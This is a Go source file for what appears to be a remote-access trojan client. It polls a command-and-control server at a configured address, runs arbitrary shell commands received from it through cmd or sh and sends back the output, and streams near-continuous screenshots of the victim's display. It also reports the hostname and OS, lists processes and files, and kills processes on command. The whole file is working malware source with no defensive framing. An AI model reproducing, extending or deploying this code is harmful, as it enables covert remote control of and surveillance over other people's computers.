package main

import (
    "bytes"
    "encoding/json"
    "image/jpeg"
    "io"
    "io/ioutil"
    "log"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strconv"
    "time"

    "github.com/kbinani/screenshot"
)

var (
    serverIP      = "127.0.0.1:8080"
    clientID      = getClientID()
    uploadURL     = "http://" + serverIP + "/upload?id=" + clientID
    cmdPollURL    = "http://" + serverIP + "/cmd/poll?id=" + clientID
    cmdResultURL  = "http://" + serverIP + "/cmd/result?id=" + clientID
    procPollURL   = "http://" + serverIP + "/proc/poll?id=" + clientID
    procResultURL = "http://" + serverIP + "/proc/result?id=" + clientID
    filePollURL   = "http://" + serverIP + "/file/poll?id=" + clientID
    fileResultURL = "http://" + serverIP + "/file/result?id=" + clientID
    killURL       = "http://" + serverIP + "/kill?id=" + clientID
)

type ShellCommand struct {
    Command string
}

type ShellResponse struct {
    Output string
}

type Process struct {
    PID  int    `json:"pid"`
    Name string `json:"name"`
}

type KillRequest struct {
    PID int `json:"pid"`
}

type FileInfo struct {
    Name    string `json:"name"`
    Size    int64  `json:"size"`
    IsDir   bool   `json:"is_dir"`
    ModTime string `json:"mod_time"`
    Path    string `json:"path"`
}

type FileRequest struct {
    Action string `json:"action"`
    Path   string `json:"path"`
}

func getClientID() string {
    hostname, err := os.Hostname()
    if err != nil {
        return "unknown"
    }
    return hostname
}

func sendSystemInfo() {
    info := map[string]string{
        "os":      runtime.GOOS,
        "version": runtime.Version(),
    }

    data, _ := json.Marshal(info)
    http.Post(uploadURL, "application/json", bytes.NewReader(data))
}

func listProcesses() ([]Process, error) {
    var processes []Process

    if runtime.GOOS == "windows" {
        out, err := exec.Command("tasklist").Output()
        if err != nil {
            return nil, err
        }
        lines := bytes.Split(out, []byte("\r\n"))
        for _, line := range lines[3:] {
            fields := bytes.Fields(line)
            if len(fields) >= 2 {
                pid := string(fields[1])
                pidInt, err := strconv.Atoi(pid)
                if err == nil {
                    processes = append(processes, Process{
                        PID:  pidInt,
                        Name: string(fields[0]),
                    })
                }
            }
        }
    } else {
        out, err := exec.Command("ps", "-e", "-o", "pid=,comm=").Output()
        if err != nil {
            return nil, err
        }
        lines := bytes.Split(out, []byte("\n"))
        for _, line := range lines {
            fields := bytes.Fields(line)
            if len(fields) >= 2 {
                pid, err := strconv.Atoi(string(fields[0]))
                if err == nil {
                    processes = append(processes, Process{PID: pid, Name: string(fields[1])})
                }
            }
        }
    }

    return processes, nil
}

func listFiles(path string) ([]FileInfo, error) {
    var files []FileInfo

    if path == "/" && runtime.GOOS == "windows" {
        return getWindowsDrives()
    }

    entries, err := ioutil.ReadDir(path)
    if err != nil {
        return nil, err
    }

    if path != "/" && path != "" {
        parent := filepath.Dir(path)
        files = append(files, FileInfo{
            Name:  "..",
            IsDir: true,
            Path:  parent,
        })
    }

    for _, entry := range entries {
        fullPath := filepath.Join(path, entry.Name())
        files = append(files, FileInfo{
            Name:    entry.Name(),
            Size:    entry.Size(),
            IsDir:   entry.IsDir(),
            ModTime: entry.ModTime().Format("2006-01-02 15:04:05"),
            Path:    fullPath,
        })
    }

    return files, nil
}

func getWindowsDrives() ([]FileInfo, error) {
    var drives []FileInfo

    for i := 'A'; i <= 'Z'; i++ {
        drive := string(i) + ":\\"
        if _, err := os.Stat(drive); err == nil {
            drives = append(drives, FileInfo{
                Name:  drive,
                IsDir: true,
                Path:  drive,
            })
        }
    }

    return drives, nil
}

func main() {
    // Only keep this log
    log.Printf("[%s] Connecting to %s", clientID, serverIP)

    sendSystemInfo()

    go shellPoller()
    go procPoller()
    go filePoller()
    go processKiller()

    for {
        img, err := screenshot.CaptureDisplay(0)
        if err != nil {
            time.Sleep(5 * time.Second)
            continue
        }

        var buf bytes.Buffer
        if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 75}); err != nil {
            continue
        }

        resp, err := http.Post(uploadURL, "image/jpeg", &buf)
        if err == nil {
            resp.Body.Close()
        }

        time.Sleep(100 * time.Millisecond)
    }
}

func shellPoller() {
    for {
        resp, err := http.Get(cmdPollURL)
        if err != nil {
            time.Sleep(5 * time.Second)
            continue
        }
        body, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        var cmd ShellCommand
        if json.Unmarshal(body, &cmd) != nil || cmd.Command == "" {
            time.Sleep(2 * time.Second)
            continue
        }

        var out []byte
        if runtime.GOOS == "windows" {
            out, _ = exec.Command("cmd", "/C", cmd.Command).CombinedOutput()
        } else {
            out, _ = exec.Command("sh", "-c", cmd.Command).CombinedOutput()
        }

        res := ShellResponse{Output: string(out)}
        data, _ := json.Marshal(res)
        http.Post(cmdResultURL, "application/json", bytes.NewReader(data))

        time.Sleep(1 * time.Second)
    }
}

func procPoller() {
    for {
        resp, err := http.Get(procPollURL)
        if err != nil {
            time.Sleep(5 * time.Second)
            continue
        }
        body, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        var cmd map[string]string
        if json.Unmarshal(body, &cmd) != nil || cmd["command"] != "list" {
            time.Sleep(2 * time.Second)
            continue
        }

        procs, err := listProcesses()
        if err != nil {
            continue
        }

        var out string
        for _, p := range procs {
            out += strconv.Itoa(p.PID) + " " + p.Name + "\n"
        }

        payload := map[string]string{"output": out}
        data, _ := json.Marshal(payload)
        http.Post(procResultURL, "application/json", bytes.NewReader(data))

        time.Sleep(2 * time.Second)
    }
}

func filePoller() {
    for {
        resp, err := http.Get(filePollURL)
        if err != nil {
            time.Sleep(5 * time.Second)
            continue
        }
        body, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        var req FileRequest
        if json.Unmarshal(body, &req) != nil || req.Action == "" {
            time.Sleep(2 * time.Second)
            continue
        }

        switch req.Action {
        case "list":
            files, err := listFiles(req.Path)
            if err != nil {
                files = []FileInfo{}
            }
            data, _ := json.Marshal(files)
            http.Post(fileResultURL, "application/json", bytes.NewReader(data))
        }

        time.Sleep(1 * time.Second)
    }
}

func processKiller() {
    for {
        resp, err := http.Get(killURL)
        if err != nil {
            time.Sleep(5 * time.Second)
            continue
        }
        body, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        var req KillRequest
        if json.Unmarshal(body, &req) != nil || req.PID == 0 {
            time.Sleep(3 * time.Second)
            continue
        }

        if runtime.GOOS == "windows" {
            exec.Command("taskkill", "/PID", strconv.Itoa(req.PID), "/F").Run()
        } else {
            if p, err := os.FindProcess(req.PID); err == nil {
                p.Kill()
            }
        }

        time.Sleep(3 * time.Second)
    }
}
